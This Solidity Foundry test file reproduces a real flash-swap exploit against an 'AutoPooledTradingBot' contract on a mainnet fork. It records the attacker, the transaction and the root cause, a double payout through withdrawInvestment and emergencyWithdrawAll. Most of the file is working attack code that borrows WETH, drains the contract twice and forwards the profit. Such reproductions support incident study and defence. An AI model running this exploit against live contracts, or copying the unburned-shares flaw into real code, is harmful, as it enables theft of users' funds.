// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 0.15198 ETH
// Attacker : 0x8A6ce2d90EE1199F815628970a90dF73e12B5057
// Attack Contract : 0xe033880fed8A54C1F37230cC3b25aCFB1c9d4185
// Vulnerable Contract : 0x879e993e2E37DE3b47F38C13858e1f337D51448B
// Attack Tx : https://etherscan.io/tx/0x9ec3fb4ac39e179c6a4f5323f2f757faca7b71718fc9f752153387c9204cee3d
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x879e993e2E37DE3b47F38C13858e1f337D51448B#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1676
//
// Attack summary: The attacker deposited flash-borrowed ETH, withdrew 90% through withdrawInvestment, then
// emergency-withdrew the still-existing shares from the same deposit.
// Root cause: withdrawInvestment pays from totalInvested but does not burn shares or reduce pool accounting,
// leaving emergencyWithdrawAll able to pay the same position again.

address constant ATTACKER = 0x8A6ce2d90EE1199F815628970a90dF73e12B5057;
address constant VULNERABLE_CONTRACT = 0x879e993e2E37DE3b47F38C13858e1f337D51448B;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant WETH_SPX_PAIR = 0x52c77b0CB827aFbAD022E6d6CAF2C44452eDbc39;

interface IWETH {
    function deposit() external payable;
    function withdraw(
        uint256 wad
    ) external;
    function transfer(
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IAutoPooledTradingBot {
    function deposit(
        address referrer
    ) external payable;
    function withdrawInvestment(
        uint256 minExpected
    ) external;
    function emergencyWithdrawAll() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 23_160_803;
        vm.createSelectFork("mainnet", forkBlock);

        vm.label(ATTACKER, "Attacker");
        vm.label(VULNERABLE_CONTRACT, "AutoPooledTradingBot");
        vm.label(WETH, "WETH");
        vm.label(WETH_SPX_PAIR, "WETH-SPX Pair");
    }

    function testExploit() public {
        vm.deal(ATTACKER, 0);
        uint256 attackerEthBefore = ATTACKER.balance;

        // step 1: use the same no-upfront-capital shape as the trace by borrowing WETH from the pair.
        vm.startPrank(ATTACKER);
        FlashSwapAttacker flashSwapAttacker = new FlashSwapAttacker(ATTACKER);
        vm.label(address(flashSwapAttacker), "Local Flash Swap Attacker");
        flashSwapAttacker.execute();
        vm.stopPrank();

        // step 2: assert the doubled-withdrawal path produces net ETH after repaying the pair.
        uint256 attackerEthAfter = ATTACKER.balance;
        emit log_named_decimal_uint("Attacker ETH profit", attackerEthAfter - attackerEthBefore, 18);
        assertGt(attackerEthAfter - attackerEthBefore, 0.15 ether);
    }
}

contract FlashSwapAttacker is IUniswapV2Callee {
    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function execute() external {
        uint256 borrowAmount = 0.192 ether;
        IUniswapV2Pair(WETH_SPX_PAIR).swap(borrowAmount, 0, address(this), abi.encode(borrowAmount));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external override {
        require(msg.sender == WETH_SPX_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        // step 3: unwrap the flash-borrowed WETH and create a fresh victim position.
        IWETH(WETH).withdraw(amount0);
        IAutoPooledTradingBot(VULNERABLE_CONTRACT).deposit{value: amount0}(address(0));

        // step 4: withdrawInvestment pays from totalInvested but leaves shares in place.
        IAutoPooledTradingBot(VULNERABLE_CONTRACT).withdrawInvestment(0);

        // step 5: emergencyWithdrawAll pays the same still-existing shares again.
        IAutoPooledTradingBot(VULNERABLE_CONTRACT).emergencyWithdrawAll();

        // step 6: repay the WETH flash swap, then forward the remaining ETH profit.
        uint256 repayAmount = (amount0 * 1000) / 997 + 1;
        IWETH(WETH).deposit{value: repayAmount}();
        IWETH(WETH).transfer(WETH_SPX_PAIR, repayAmount);

        (bool sent,) = payable(profitReceiver).call{value: address(this).balance}("");
        require(sent, "profit transfer failed");
    }

    receive() external payable {}
}
